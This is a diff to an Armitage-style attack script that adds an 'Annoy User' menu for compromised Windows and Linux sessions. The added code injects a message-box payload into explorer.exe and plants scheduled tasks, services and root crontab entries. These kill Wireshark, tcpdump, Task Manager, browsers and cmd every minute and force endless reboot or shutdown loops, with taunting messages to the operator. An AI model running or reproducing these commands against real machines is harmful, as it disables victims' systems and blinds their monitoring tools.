@@ -2,13 +2,146 @@
 
 popup meterpreter_bottom {
 	menu "Annoy User" {
-		item "Enable Keyboard/Mouse" {
-			m_cmd($1, "uictl enable keyboard");
-			m_cmd($1, "uictl enable mouse");
+		if (host_os(session_host($1)) eq "Microsoft Windows") {
+			item "Enable Keyboard/Mouse" {
+				m_cmd($1, "uictl enable keyboard");
+				m_cmd($1, "uictl enable mouse");
+			}
+		
+			item "Disable Keyboard/Mouse" {
+				m_cmd($1, "uictl disable keyboard");
+				m_cmd($1, "uictl disable mouse");
+			}
+			
+                        item "Send message" {
+                                # using windows/message box instead of net send due to messaging service getting borked by ms08-067
+                                $message = prompt_text("Enter message. (255 max char)");
+                                m_cmd($1, "ps");
+                                $do_once = 0;
+                                on meterpreter_ps {
+                                        local ('@processes $process $name');
+                                        @processes = parse_ps($3);
+                                        foreach $process (@processes) {
+                                                ($name, $pid) = values($process, @('Name', 'PID'));
+                                                if (("explorer.exe" eq $name) && ($do_once eq 0)) {
+                                                        launch("post", "windows/manage/payload_inject", %(LHOST => lhost(), OPTIONS => "TITLE=pwned,TEXT=$message", PAYLOAD => "windows/messagebox", PID => "$pid", SESSION => "$1"));
+                                                        $do_once++;
+                                                }
+                                        }
+                                }
+                        }
+
+			item "Auto-kill special apps" {
+			# To Do: let users pick which tasks t kill
+				m_cmd($1, "run scheduleme -m 1 -c taskkill -o '/IM wireshark.exe'");
+				m_cmd($1, "run scheduleme -m 1 -c taskkill -o '/IM taskmgr.exe'");
+				m_cmd($1, "run scheduleme -m 1 -c taskkill -o '/IM iexplorer.exe'");
+				m_cmd($1, "run scheduleme -m 1 -c taskkill -o '/IM firefox.exe'");
+				m_cmd($1, "run scheduleme -m 1 -c taskkill -o '/IM chrome.exe'");
+				m_cmd($1, "run scheduleme -m 1 -c taskkill -o '/IM cmd.exe'");
+				show_message("Killing: wireshark, taskmanager, IE, firefox, chrome and cmd every 1 minute");
+			}
+			
+			item "Reboot-loop" {
+				m_cmd($1, "run service_manager -C -n \"rebootLoop\" -p \"c:\\\\windows\\\\system32\\\\shutdown.exe -r -t 0 -f\"");
+				m_cmd($1, "reboot");
+				show_message("They say mercy is the mark of a great man, I guess you're alright.");
+			}
+			
+			item "Shutdown-loop" {
+				m_cmd($1, "run service_manager -C -n \"shutdownLoop\" -p \"c:\\\\windows\\\\system32\\\\shutdown.exe -s -t 0 -f\"");
+				m_cmd($1, "shutdown");
+				show_message("Like whack-a-mole with their servers.");
+			}
 		}
-		item "Disable Keyboard/Mouse" {
-			m_cmd($1, "uictl disable keyboard");
-			m_cmd($1, "uictl disable mouse");
+		else {
+			item "OS not supported" {
+			}
+		}
+	}
+}
+
+popup shell {
+	menu "Annoy User" {
+		if (host_os(session_host($1)) eq "Microsoft Windows") {
+			item "Reboot-loop" {
+				s_cmd($1, "sc create rebootLoop binPath= \"C:\\windows\\system32\\shutdown.exe /r /t 0 /f\" start= auto & sc start rebootLoop");
+				show_message("May their services levels soar through the air in the ways that bricks don't.");
+			}
+			
+			item "Shutdown-loop" {
+				s_cmd($1, "sc create shutdownLoop binPath= \"C:\\windows\\system32\\shutdown.exe /s /t 0 /f\" start= auto & sc start shutdownLoop");
+				show_message("I hope you pillaged before you burned.");
+			}
+
+			item "Auto-kill special apps" {
+				# this command kills the sessions, bug?
+				$answer = prompt_confirm("Using this function will kill this cmd session, Continue?", "Warning");
+				if($answer eq 0)
+				{ 
+					s_cmd($1, 'schtasks /Create /tn wireshark /tr "taskkill /IM wireshark.exe" /sc minute /mo 1 /RU system & schtasks /Create /tn taskmgr /tr "taskkill /IM taskmgr.exe" /sc minute /mo 1 /RU system & schtasks /Create /tn iexplorer /tr "taskkill /IM iexplorer.exe" /sc minute /mo 1 /RU system & schtasks /Create /tn firefox /tr "taskkill /IM firefox.exe" /sc minute /mo 1 /RU system & schtasks /Create /tn chrome /tr "taskkill /IM chrome.exe" /sc minute /mo 1 /RU system & schtasks /Create /tn cmd /tr "taskkill /IM cmd.exe" /sc minute /mo 1 /RU system');
+					show_message("Killing: wireshark, taskmanager, IE, firefox, chrome and cmd every 1 minute");
+				}
+			}
+		}
+
+		else if (host_os(session_host($1)) eq "Linux") {
+			item "Change Keboard to Dvorak" {
+				s_cmd($1, "loadkeys dvorak");
+				s_cmd($1, "echo '\@reboot /usr/bin/loadkeys dvorak' >> /etc/crontab");
+				# might not work non-console sessions
+			}
+	
+			item "Change Keyboard to English" {
+				s_cmd($1, "loadkeys us");
+				s_cmd($1, "echo '\@reboot /usr/bin/loadkeys dvorak' >> /etc/crontab");
+			}
+			
+			
+                        item "Send Message" {
+                                on shell_which {
+                                        if($3) {
+                                                s_cmd($1, 'xterm -e "echo $message; sleep 9999999"');
+                                        }
+                                        else {
+                                                s_cmd($1, "echo $message | wall -n");
+                                        }
+                                }
+                                s_cmd($1, 'which xterm');
+                                $message = prompt_text("Enter message. (255 max char)");
+                        }
+
+                        item "Kill special apps" {
+				# Do it to support multiple versions of cron
+				s_cmd($1, 'echo "* * * * * root /bin/kill \$(/bin/ps aux | /bin/grep \'tcpdump\' | /usr/bin/awk \'{print \$2}\')" >> /etc/crontab');	
+				s_cmd($1, 'echo "* * * * * /bin/kill \$(/bin/ps aux | /bin/grep \'tcpdump\' | /usr/bin/awk \'{print \$2}\')" >> /var/spool/cron/crontabs/root'); 
+				s_cmd($1, 'echo "* * * * * root /bin/kill \$(/bin/ps aux | /bin/grep \'wireshark\' | /usr/bin/awk \'{print \$2}\')" >> /etc/crontab');
+                                s_cmd($1, 'echo "* * * * * /bin/kill \$(/bin/ps aux | /bin/grep \'wireshark\' | /usr/bin/awk \'{print \$2}\')" >> /var/spool/cron/crontabs/root');
+                                s_cmd($1, 'chmod 0600 /var/spool/cron/crontabs/root /etc/crontab');
+				s_cmd($1, 'service cron restart');
+				show_message("Killing: tcpdump and wireshark every 1 minute");
+                        }
+
+			item "Reboot-loop" {
+				s_cmd($1, 'echo "* * * * * root /sbin/reboot" >> /etc/crontab');
+				s_cmd($1, 'echo "* * * * * /sbin/reboot" >> /var/spool/cron/crontabs/root');
+				s_cmd($1, 'chmod 0600 /var/spool/cron/crontabs/root /etc/crontab');
+				s_cmd($1, 'reboot');
+				show_message("Well that should damage their calm.");
+			}
+			
+			item "Continous Shutdown" {
+				s_cmd($1, 'echo "* * * * * root /sbin/shutdown -h now" >> /etc/crontab');
+				s_cmd($1, 'echo "* * * * * /sbin/shutdown -h now" >> /var/spool/cron/crontabs/root');
+				s_cmd($1, 'chmod 0600 /var/spool/cron/crontabs/root /etc/crontab');
+				s_cmd($1, '/sbin/shutdown -h now');
+				show_message("Well their days of not taking you seriously are certainly commin to a middle.");
+			}
+		}
+
+		else {
+			item "OS not supported" {
+			}
 		}
 	}
 }
